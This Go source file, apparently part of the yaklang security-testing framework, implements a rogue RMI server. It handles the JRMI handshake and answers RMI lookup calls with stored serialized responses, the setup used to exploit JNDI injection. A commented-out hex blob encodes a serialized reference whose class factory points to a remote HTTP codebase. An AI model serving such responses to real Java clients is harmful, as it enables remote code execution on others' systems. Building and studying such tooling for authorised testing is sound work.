package facades

import (
	"bytes"
	"encoding/binary"
	"errors"
	"github.com/yaklang/yaklang/common/log"
	"github.com/yaklang/yaklang/common/utils"
	"github.com/yaklang/yaklang/common/utils/jreader"
	"github.com/yaklang/yaklang/common/yserx"
	"net"
	"time"
)

var serializationHeader = []byte{0xac, 0xed, 0x00, 0x05}

var help = `
package sun.rmi.transport;

public class TransportConstants {
    /** Transport magic number: "JRMI"*/
    public static final int Magic = 0x4a524d49;
    /** Transport version number */
    public static final short Version = 2;

    /** Connection uses stream protocol */
    public static final byte StreamProtocol = 0x4b;
    /** Protocol for single operation per connection; no ack required */
    public static final byte SingleOpProtocol = 0x4c;
    /** Connection uses multiplex protocol */
    public static final byte MultiplexProtocol = 0x4d;

    /** Ack for transport protocol */
    public static final byte ProtocolAck = 0x4e;
    /** Negative ack for transport protocol (protocol not supported) */
    public static final byte ProtocolNack = 0x4f;

    /** RMI call */
    public static final byte Call = 0x50;
    /** RMI return */
    public static final byte Return = 0x51;
    /** Ping operation */
    public static final byte Ping = 0x52;
    /** Acknowledgment for Ping operation */
    public static final byte PingAck = 0x53;
    /** Acknowledgment for distributed GC */
    public static final byte DGCAck = 0x54;

    /** Normal return (with or without return value) */
    public static final byte NormalReturn = 0x01;
    /** Exceptional return */
    public static final byte ExceptionalReturn = 0x02;
}
`

const rmiMagic uint64 = 0x4a524d49
const (
	rmiConnectionStreamProtocol    = 0x4b
	rmiConnectionSingleOpProtocol  = 0x4c
	rmiConnectionMultiplexProtocol = 0x4d
)

var (
	rmiACK []byte = []byte{0x4e}
)

const (
	rmiCommandCall    byte = 0x50
	rmiCommandReturn  byte = 0x51
	rmiCommandPing    byte = 0x52
	rmiCommandPingACK byte = 0x53
	rmiCommandDGCACK  byte = 0x54
)

const (
	rmiNormalReturn    byte = 0x01
	rmiExceptionReturn byte = 0x02
)

func (f *FacadeServer) rmiShakeHands(peekConn *utils.BufferedPeekableConn) error {
	var conn net.Conn = peekConn
	conn.SetDeadline(time.Now().Add(300 * time.Second))
	reader := conn
	byt := make([]byte, 7)

	_, err := reader.Read(byt)
	if err != nil {
		log.Errorf("read header failed: %s", err)
		return err
	}
	// 初步握手
	headerRaw := byt[:4]
	headerRaw = append(bytes.Repeat([]byte{0x00}, 4), headerRaw...)
	header := binary.BigEndian.Uint64(headerRaw)

	if header != rmiMagic {
		log.Errorf("not a rmi client connection: 0x%08x", header)
		return err
	}

	// 读取版本
	verRaw := byt[4:6]
	verRaw = append(bytes.Repeat([]byte{0x00}, 6), verRaw...)
	ver := binary.BigEndian.Uint64(verRaw)

	log.Infof("rmi client connection from [%s] ver: 0x%02x", conn.RemoteAddr().String(), ver)

	protocol := byt[6]
	//protocolRaw = append(bytes.Repeat([]byte{0x00}, 7), protocolRaw...)
	//protocol := binary.BigEndian.Uint64(protocolRaw)
	//protocol, _ := jreader.ReadByteToInt(reader)
	log.Infof("protocol: 0x%02x", protocol)
	// 读取 Connection 的协议
	flag := protocol

	switch flag {
	case rmiConnectionStreamProtocol:
		log.Infof("%v's protocol: stream", conn.RemoteAddr())
		var buffer bytes.Buffer
		buffer.Write(rmiACK)
		// 写入  SuggestedHost Port
		// UTF + Int(4)
		remoteAddr := f.ConvertRemoteAddr(conn.RemoteAddr().String())
		remoteIP, remotePort, _ := utils.ParseStringToHostPort(remoteAddr)
		buffer.Write(jreader.MarshalUTFString(remoteIP))
		buffer.Write(jreader.IntTo4Bytes(remotePort))
		_, err = conn.Write(buffer.Bytes())
		if err != nil {
			return utils.Errorf("write failed: %s", err)
		}
		log.Infof("server rmi suggested: %v", utils.HostPort(remoteIP, remotePort))
		n, _ := jreader.Read2ByteToInt(conn)
		CIP, _ := jreader.ReadBytesLengthInt(conn, n)
		CPort, _ := jreader.Read4ByteToInt(conn)
		log.Infof("client rmi addr: %v", utils.HostPort(string(CIP), CPort))
		f.triggerNotification(RMIHandshakeMsgFlag, peekConn.GetOriginConn(), "", nil)
		//conn.w
	case rmiConnectionSingleOpProtocol:
		log.Infof("%v's protocol: single-op (Unsupported)", conn.RemoteAddr())
	case rmiConnectionMultiplexProtocol:
		log.Infof("%v's protocol: multiplex (Unsupported)", conn.RemoteAddr())
	default:
		log.Infof("%v's protocol: Unsupported protocol", conn.RemoteAddr())
		return utils.Error("Unsupported protocol")
	}
	return nil
}

func (f *FacadeServer) rmiServe(peekConn *utils.BufferedPeekableConn) error {
	var conn net.Conn = peekConn
	//var mirror bytes.Buffer
	//defer func() {
	//	println(codec.EncodeToHex(mirror.Bytes()))
	//}()
	//
	log.Infof("start to handle reader for %v", conn.RemoteAddr())

	log.Info("start to recv command[byte]")
	conn.SetReadDeadline(time.Now().Add(1 * time.Second))
	//var buf = make([]byte, 1)
	//_, err := io.ReadAtLeast(conn, buf, 1)
	buf := utils.StableReaderEx(conn, 1*time.Second, 10240)
	//if err != nil {
	//	return utils.Errorf("read rmi command failed: %s", err)
	//}
	//if len(buf) != 1 {
	//	return utils.Errorf("read rmi command failed...")
	//}
	switch buf[0] {
	case rmiCommandCall:
		objectReader := bytes.NewReader(buf[1:])
		objs, err := yserx.ParseJavaSerializedFromReader(objectReader)
		if err != nil {
			return err
		}
		if len(objs) != 2 {
			return errors.New("invalid request")
		}
		var className string
		if v, ok := objs[1].(*yserx.JavaString); ok {
			className = string(v.Raw)
		} else {
			return errors.New("invalid request")
		}
		data, verbose, ok := f.rmiResourceAddrs.GetResource(className)
		if !ok {
			return nil
		}
		conn.Write(data)
		f.triggerNotificationEx(RMIMsgFlag, peekConn.GetOriginConn(), className, data, verbose)
		return nil
		//log.Infof("conn[%s]'s call command received", conn.RemoteAddr())
		//conn.SetReadDeadline(time.Now().Add(2 * time.Second))
		//
		//respClassS := "aced0005770f01b6a4adc600000181b7af0405800d7372002a636f6d2e73756e2e6a6e64692e726d692e72656769737472792e5265666572656e636557726170706572545a0e2497c2c5f00200014c0007777261707065657400184c6a617661782f6e616d696e672f5265666572656e63653b740021687474703a2f2f3139322e3136382e3130312e3131363a383039302f2374657374787200236a6176612e726d692e7365727665722e556e696361737452656d6f74654f626a65637445091215f5e27e31020003490004706f72744c00036373667400284c6a6176612f726d692f7365727665722f524d49436c69656e74536f636b6574466163746f72793b4c00037373667400284c6a6176612f726d692f7365727665722f524d49536572766572536f636b6574466163746f72793b740021687474703a2f2f3139322e3136382e3130312e3131363a383039302f23746573747872001c6a6176612e726d692e7365727665722e52656d6f7465536572766572c719071268f339fb020000740021687474703a2f2f3139322e3136382e3130312e3131363a383039302f23746573747872001c6a6176612e726d692e7365727665722e52656d6f74654f626a656374d361b4910c61331e030000740021687474703a2f2f3139322e3136382e3130312e3131363a383039302f2374657374787077120010556e696361737453657276657252656678000000007070737200166a617661782e6e616d696e672e5265666572656e6365e8c69ea2a8e98d090200044c000561646472737400124c6a6176612f7574696c2f566563746f723b4c000c636c617373466163746f72797400124c6a6176612f6c616e672f537472696e673b4c0014636c617373466163746f72794c6f636174696f6e71007e000e4c0009636c6173734e616d6571007e000e740021687474703a2f2f3139322e3136382e3130312e3131363a383039302f23746573747870737200106a6176612e7574696c2e566563746f72d9977d5b803baf010300034900116361706163697479496e6372656d656e7449000c656c656d656e74436f756e745b000b656c656d656e74446174617400135b4c6a6176612f6c616e672f4f626a6563743b740021687474703a2f2f3139322e3136382e3130312e3131363a383039302f237465737478700000000000000000757200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c020000740021687474703a2f2f3139322e3136382e3130312e3131363a383039302f237465737478700000000a707070707070707070707874000474657374740021687474703a2f2f3139322e3136382e3130312e3131363a383039302f2374657374740003466f6f"
		//respClass, err := codec.DecodeHex(respClassS)
		//if err != nil {
		//	return err
		//}
		////addr := []byte(f.rmiResourceAddrs)
		//
		//addr, ok := f.rmiResourceAddrs[className]
		//if !ok {
		//	f.triggerNotificationEx("rmi", peekConn.GetOriginConn(), className, respClass, "<empty>")
		//	return utils.Errorf("not found class: %s", className)
		//}
		//respClass = bytes.Replace(respClass, []byte("!http://192.168.101.116:8090/#test"), append(yserx.IntToByte(len(addr)), addr...), -1)
		//respClass = bytes.Replace(respClass, []byte("\x04test"), append(yserx.IntToByte(len(className)), className...), -1)
		//conn.Write(append([]byte{rmiCommandReturn}, respClass...))
		//println(codec.Md5(fmt.Sprintf("%p", peekConn.GetOriginConn())))
		//f.triggerNotificationEx("rmi", peekConn.GetOriginConn(), className, respClass, className)
		//return nil
	case rmiCommandPing:
		log.Infof("conn[%s]'s ping command received", conn.RemoteAddr())
	case rmiCommandReturn:
		log.Infof("conn[%s]'s return command received", conn.RemoteAddr())
	case rmiCommandPingACK:
		log.Infof("conn[%s]'s ping-ack command received", conn.RemoteAddr())
	case rmiCommandDGCACK:
		log.Infof("conn[%s]'s dgc-ack command received", conn.RemoteAddr())
	}
	return utils.Errorf("not implemented")
}
